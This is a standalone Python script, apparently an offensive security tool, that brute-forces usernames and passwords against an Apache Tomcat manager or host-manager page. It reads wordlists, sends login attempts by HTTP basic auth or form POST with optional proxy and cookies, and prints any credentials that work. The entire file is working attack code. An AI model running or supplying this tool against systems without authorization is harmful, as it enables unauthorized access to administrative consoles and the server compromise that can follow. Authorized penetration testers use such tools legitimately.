#!/usr/bin/python

import requests
import argparse
import sys

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Tomcat manager or host-manager credential bruteforcing")

# Define command-line arguments
parser.add_argument("-U", "--url", type=str, required=True, help="URL to tomcat page")
parser.add_argument("-path", "--path", type=str, required=True, help="manager or host-manager URI")
parser.add_argument("-u", "--username", type=str, required=False, help="Single Username")
parser.add_argument("-p", "--password", type=str, required=False, help="Single Password")
parser.add_argument("-UF", "--usernames-file", type=str, required=False, help="Users File")
parser.add_argument("-PF", "--passwords-file", type=str, required=False, help="Passwords Files")
parser.add_argument("--proxy", type=str, required=False, help="Proxy address (e.g., http://127.0.0.1:8080)")
parser.add_argument("-m", "--method", type=str, choices=['GET', 'POST'], required=True, help="HTTP Method (GET or POST)")
parser.add_argument("-C", "--cookie", type=str, required=False, help="Cookie string (e.g., 'session=12345; token=abcd')")
parser.add_argument("-S", "--success-condition", type=str, required=False, help="Success condition (e.g., 'Welcome back')")
parser.add_argument("-F", "--failure-condition", type=str, required=False, help="Failure condition (e.g., 'Invalid credentials')")

# Parse the arguments provided by the user
args = parser.parse_args()

# Assign the parsed arguments to variables
url = args.url
uri = args.path
username = args.username
password = args.password
users_file = args.usernames_file
passwords_file = args.passwords_file
proxy_address = args.proxy
method = args.method.upper()
cookie_string = args.cookie
success_condition = args.success_condition
failure_condition = args.failure_condition

# Configure the proxy if provided
proxies = {}
if proxy_address:
    proxies = {"http": proxy_address, "https": proxy_address}

# Convert cookie string to a dictionary
cookies = {}
if cookie_string:
    cookie_items = cookie_string.split('; ')
    for item in cookie_items:
        key, value = item.split('=')
        cookies[key] = value

# Concatenate the URL and URI to form the complete endpoint for bruteforcing
new_url = url + uri

# Read and prepare usernames and passwords
usernames = []
passwords = []

if username:
    usernames.append(username.encode())
else:
    with open(users_file, "rb") as f_users:
        usernames = [x.strip() for x in f_users]

if password:
    passwords.append(password.encode())
else:
    with open(passwords_file, "rb") as f_pass:
        passwords = [x.strip() for x in f_pass]

total_attempts = len(usernames) * len(passwords)

print("\n[+] Attacking.....")

attempt_count = 0

# Custom headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

for u in usernames:
    for p in passwords:
        attempt_count += 1
        message = f"\rAttempt {attempt_count} of {total_attempts}: Trying username '{u.decode()}' with password '{p.decode()}'\033[K"
        sys.stdout.write(message)
        sys.stdout.flush()

        data = {'username': u, 'password': p}  # Adjust data keys if necessary

        if method == 'GET':
            response = requests.get(new_url, headers=headers, cookies=cookies, auth=(u, p), proxies=proxies)
        elif method == 'POST':
            response = requests.post(new_url, headers=headers, cookies=cookies, data=data, proxies=proxies)

        # Check for success condition in the response if it's provided
        if success_condition and success_condition.lower() in response.text.lower():
            print("\n\n[+] Success!!")
            print(f"[+] Username: {u.decode()}\n[+] Password: {p.decode()}")
            sys.exit(0)
        # Check if failure condition is provided and not met in the response
        elif failure_condition and failure_condition.lower() not in response.text.lower():
            print("\n\n[+] Success!! (Failure condition not met)")
            print(f"[+] Username: {u.decode()}\n[+] Password: {p.decode()}")
            sys.exit(0)
        # If failure condition is provided and met, continue to the next attempt
        elif failure_condition and failure_condition.lower() in response.text.lower():
            continue
        # If no success_condition provided and failure_condition not met, consider it a success
        elif not success_condition:
            print("\n\n[+] Success!! (No failure condition met)")
            print(f"[+] Username: {u.decode()}\n[+] Password: {p.decode()}")
            sys.exit(0)

# If script reaches this point, no successful login was found
print("\n\n[+] Failed!!")
print("[+] Could not find valid credentials.")
